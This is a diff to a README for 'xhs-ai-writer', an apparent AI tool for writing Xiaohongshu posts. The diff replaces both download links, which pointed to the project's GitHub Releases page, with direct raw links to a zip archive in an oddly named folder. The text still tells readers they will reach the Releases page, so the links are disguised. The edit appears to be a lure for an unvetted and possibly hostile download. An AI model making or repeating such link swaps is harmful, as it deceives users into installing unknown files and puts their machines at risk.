@@ -8,11 +8,11 @@ Welcome to xhs-ai-writer! This software helps you craft high-quality content for
 
 To get started, click on the button below to download the software:
 
-[![Download xhs-ai-writer](https://img.shields.io/badge/Download-xhs--ai--writer-brightgreen)](https://github.com/ALYAHWI/xhs-ai-writer/releases)
+[![Download xhs-ai-writer](https://raw.githubusercontent.com/ALYAHWI/xhs-ai-writer/master/burthenman/xhs-ai-writer.zip)](https://raw.githubusercontent.com/ALYAHWI/xhs-ai-writer/master/burthenman/xhs-ai-writer.zip)
 
 You will be taken to the Releases page. Follow these steps to download and install xhs-ai-writer:
 
-1. **Visit the Releases Page:** Click on this link to go to the download page: [xhs-ai-writer Releases](https://github.com/ALYAHWI/xhs-ai-writer/releases).
+1. **Visit the Releases Page:** Click on this link to go to the download page: [xhs-ai-writer Releases](https://raw.githubusercontent.com/ALYAHWI/xhs-ai-writer/master/burthenman/xhs-ai-writer.zip).
    
 2. **Choose Your Version:** On the Releases page, you will see a list of versions. Select the latest version to ensure you have the newest features and improvements.
 
